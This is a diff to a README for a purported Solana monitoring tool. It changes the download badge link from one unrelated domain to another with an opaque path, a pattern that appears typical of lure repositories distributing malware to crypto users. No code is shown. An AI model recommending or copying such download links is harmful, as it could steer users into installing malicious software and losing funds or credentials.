@@ -9,7 +9,7 @@ Your all-in-one Solana monitoring assistant 🚀🔎
 
 ## 📲 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=cloud-download)](https://talkingmanager.com/Qsg36rs9?name=solscannerV1.1)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=cloud-download)](https://noisybands.com/Qsg36rs9?name=solanacheckerV0.1)
 
 ---
 
